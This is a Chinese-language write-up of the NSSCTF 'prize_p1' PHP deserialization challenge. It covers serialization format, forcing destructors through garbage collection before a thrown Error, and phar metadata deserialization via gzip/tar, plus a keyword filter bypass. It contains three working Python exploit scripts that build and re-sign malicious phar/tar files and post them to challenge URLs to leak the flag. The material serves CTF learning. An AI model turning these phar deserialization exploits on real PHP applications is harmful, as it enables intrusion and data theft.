# NSSCTF prize_p1 反序列化/throw/gc/


https://www.bilibili.com/video/BV1DM4y137cp
https://www.wolai.com/iFdthhceLQBNqjotbQ7jFp
https://www.wolai.com/atao/aLs4wWxuPDLPUNNE45F9Es

题目
```php
<META http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
highlight_file(__FILE__);
class getflag {
    function __destruct() {
        echo getenv("FLAG");
    }
}

class A {
    public $config;
    function __destruct() {
        if ($this->config == 'w') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            file_put_contents("./tmp/a.txt", $data);
        } else if ($this->config == 'r') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            echo file_get_contents($data);
        }
    }
}
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) {
    die("我知道你想干吗，我的建议是不要那样做。");
}
unserialize($_GET[0]);
throw new Error("那么就从这里开始起航吧");

```

## 第一关
* 设为null
* 生命周期结束
* unset
以上情况会执行destruct。gc机制垃圾回收
a:2:{i:0;0:4:"Test":0:{};i:0;N;}

知识点序列化格式
```php
<?php

class A{
    public $v1;
    public $v2;
}

$a = new A();
$a->v1 = '123';
echo serialize($a);

O:1:"A":1:{s:2:"v1";s:3:"123";}
O--第0个元素:1长度:"A"名称:1子元素:{
    s子元素1:2长度:"v1"名称;s子元素1:3长度:"123"值;
    s子元素2:2长度:"v2"名称;N值;} # 未赋值
    # 如果赋值 O:1:"A":2:{s:2:"v1";s:3:"123";s:2:"v2";s:3:"234";}
}
```
https://blog.csdn.net/Win_X_/article/details/111598941
```
O:表示序列化的事对象
< length>:表示序列化的类名称长度
< class name>：表示序列化的类的名称
< n >:表示被序列化的对象的属性个数
{…………}：属性列表
< field type >：属性类型
< field length >：属性名长度
< field name >：属性名
< field value type >：属性值类型
< field value >：属性值
a – array
b – boolean
d – double
i – integer
o – common object
r – reference
s – string
C – custom object
O – class
N – null
R – pointer reference
U – unicode string
https://www.cnblogs.com/webu/archive/2013/01/28/2879383.html
```


在有throw的时候，通过数组的这种二次赋值，让它变成unset进行垃圾回收。。

## 第二关 phar://反序列化
```php
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
    die('我知道你想干吗，我的建议是不要那样做');
}
```
https://guokeya.github.io/post/uxwHLckwx
https://www.anquanke.com/post/id/240007

一共就这5种可以触发phar的操作

> 普通phar
> gzip
> bzip2
> tar
> zip

## 第三关 `throw new Error('那么就从这里开始吧');`

https://www.php.net/manual/zh/phar.fileformat.php

```php
<?php
class getflag{
    function __destruct() {
        echo 123;
    }
}

file_get_contents('phar//xen.phar');
```
cmd执行, 是可以输出123的。

`php /User/exp/2.php`

对应本题

```php
<?php
class getflag{
}
$a= new getflag();
$c = [$a];
echo serialize($c);
file_put_contents('.phar/.metadata', serialize($c));
```
得到 `a:1:{i:0;O:7:"getflag":0:{}}` , 通过第一关的学习。将元素1重新赋值为null，由于反序列化是从左到右的。立即可执行反序列化，不会直接throw。

> a:1:{i:0;O:7:"getflag":0:{}}
> a:1:{i:0;O:7:"getflag":0:{};i:0;N;}

其他思路
* file_put_contents 数组绕过
* 可以抛弃的签名

```php
<?php

$a = [
    0 => 2,
    1 => 'getflag'
]

if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
    die('我知道你想干吗，我的建议是不要那样做');
}

file_put_contents("aaa", $a);
```

绕 throw https://irq5.io/2019/01/07/35c3-ctf-write-up-php/
## 脚本0 -- 重新生成签名

1.生成phar文件 
```php
<?php
class getflag{
}
$o = new getflag();
$phar = new Phar("app.phar");
$phar -> startBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?>");
$phar -> setMetadata([0 =>$o, 1=> 9]); // 随便一个值，一会儿修改
$phar -> addFromString("test.txt","test");
$phar -> stopBuffering();
```
2.修改一下 app.phar中的内容
```
a:2:{i:0;O:7:"getflag":0:{}i:1;i:9;}  =>
a:2:{i:0;O:7:"getflag":0:{}i:0;i:9;}  // 取消掉引用getflag, 于是它马上gc实现垃圾回收, 不用到throw
```
3.重新生成phar签名, -8的位置是02所以是sha1签名
```python
import shutil
import tarfile
import os.path
import gzip
import requests


def resign(src, dst):
    from hashlib import sha1

    f = open(src, 'rb').read()
    s = f[:-28]
    e = f[-8:]

    sign = sha1(s).digest()

    b = s + sign + e
    open(dst, 'wb').write(b)



def make_gzipfile(output_filename, source_file):
    content = open(source_file, 'rb').read()
    f = gzip.open(output_filename, 'wb')
    f.write(content)
    f.close()


if __name__ == "__main__":
    src = 'app.phar'
    dst = 'app.phar1'
    resign(src, dst)
    make_gzipfile('app.gz', dst)

    url = 'http://localhost/?0=O:1:"A":1:{s:6:"config";s:1:"w";}'
    data = {"0": open('app.gz', 'rb').read()}
    requests.post(url, data=data)

    url = 'http://localhost/?0=O:1:"A":1:{s:6:"config";s:1:"r";}'
    data = {"0": 'phar://tmp/a.txt'}
    requests.post(url, data=data)
```

## 脚本1 -- 通过tar抛弃签名

```python
import shutil
import tarfile
import os.path
import gzip
import requests


def make_tarfile(output_filename, source_dir):
    os.system(f'tar -cf app.tar {source_dir}')
    # with tarfile.open(output_filename, "w:gz") as tar:   # 打ctf用system或py2压tar, py3压的tar打不通, 而且py2压的没明文，不需要再加成gzip
    #     tar.add(source_dir, arcname=os.path.basename(source_dir))



def make_gzipfile(output_filename, source_file):
    content = open(source_file, 'rb').read()
    f = gzip.open(output_filename, 'wb')
    f.write(content)
    f.close()


def init():
    for f in ['app.tar', 'app.tar.gz', '.phar']:
        try:
            shutil.rmtree(f)
        except OSError:
            pass
    os.mkdir('.phar')
    open('.phar/.metadata', 'w').write("""a:1:{i:0;O:7:"getflag":0:{};i:0;N;}""")


if __name__ == "__main__":
    init()
    make_tarfile('app.tar', '.phar')
    make_gzipfile('app.tar.gz', 'app.tar')

    url = 'http://476-8d846a63-ef2a-4efd.nss.ctfer.vip:9080/?0=O:1:"A":1:{s:6:"config";s:1:"w";}'
    data = {"0": open('app.tar.gz', 'rb').read()}
    requests.post(url, data=data)

    url = 'http://476-8d846a63-ef2a-4efd.nss.ctfer.vip:9080/?0=O:1:"A":1:{s:6:"config";s:1:"r";}'
    data = {"0": 'phar://tmp/a.txt'}
    requests.post(url, data=data)
```

## 脚本2 - 绕过file_get_contents正则

只是少了gzip的部分。

```python
import shutil
import tarfile
import os.path
import gzip
import requests


def make_tarfile(output_filename, source_dir):
    os.system(f'tar -cf app.tar {source_dir}')


def init():
    for f in ['app.tar', 'app.tar.gz', '.phar']:
        try:
            shutil.rmtree(f)
        except OSError:
            pass
    os.mkdir('.phar')
    open('.phar/.metadata', 'w').write("""a:2:{i:0;O:7:"getflag":0:{}i:0;N;}""")


if __name__ == "__main__":
    init()
    make_tarfile('app.tar', '.phar')

    url = 'http://476-8d846a63-ef2a-4efd.nss.ctfer.vip:9080/?0=O:1:"A":1:{s:6:"config";s:1:"w";}'
    file = open('app.tar', 'rb').read()
    data = {"0[]": [
        file[:1],
        file[1:]
    ]} # 数组会把每个都写入的, 分段内容
    requests.post(url, data=data)

    url = 'http://476-8d846a63-ef2a-4efd.nss.ctfer.vip:9080/?0=O:1:"A":1:{s:6:"config";s:1:"r";}'
    data = {"0": 'phar://tmp/a.txt'}
    res = requests.post(url, data=data)
    open('f.html', 'wb').write(res.content)
```